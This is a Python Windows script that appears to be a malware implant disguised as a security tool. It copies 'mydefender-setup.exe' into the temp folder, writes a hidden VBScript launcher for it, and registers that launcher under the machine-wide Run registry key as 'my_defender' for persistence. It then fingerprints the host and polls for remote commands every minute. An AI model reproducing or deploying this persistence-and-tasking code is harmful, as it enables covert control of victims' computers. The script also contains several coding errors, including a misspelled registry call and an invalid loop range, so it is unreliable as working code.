import winreg
import time
from utils import *
import os
import tempfile
import winreg
import schedule

def init():
    EXE_LOC = tempfile.gettempdir() + "\\mydefender-setup.exe"
    VBS_LOC = tempfile.gettempdir() + "\\mydefender-setup.vbs"

    # Check if the executables do not exist
    if not os.path.exists(EXE_LOC) and not os.path.exists(VBS_LOC):
        # The payload for script runner
        payload = 'Set WshShell = WScript.CreateObject("WScript.Shell")\nWshShell.Run """{0}""", 0 , false'.format(EXE_LOC)
        # Write if to the file
        with open(VBS_LOC, 'w') as f:
            f.write(payload)
        # Copy the files to the system
        os.system('copy %s %s'%("mydefender-setup.exe", EXE_LOC))

    # Open the registery
    wr = winreg.ConnectRegistery(None, winreg.HKEY_LOCAL_MACHINE)
    # Open the run key
    with winreg.OpenKey(wr, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", winreg.KEY_ALL_ACCESS) as rk:
        was_found = False
        for i in range(0, 2e32):
            try:
                (k, _, _) = winreg.EnumValue(rk, i)[0]
                if k == "my_defender":
                    was_found = True
                    break
            except:
                pass
        
        # If the entry was not found
        if not was_found:
            # Add the key
            winreg.SetValueEx(rk, "my_defender", 0, winreg.REG_EXPAND_SZ, VBS_LOC)

        # Close the key (Alternative to: winreg.CloseKey(hkey))
        rk.Close()

    # Generate a fingerprint
    create_fp()


def main():
    init()

    schedule.every(1).minutes.do(fetch_commands)
    while True:
        schedule.run_pending()
        time.sleep(1)

    
if __name__ == '__main__':
    main()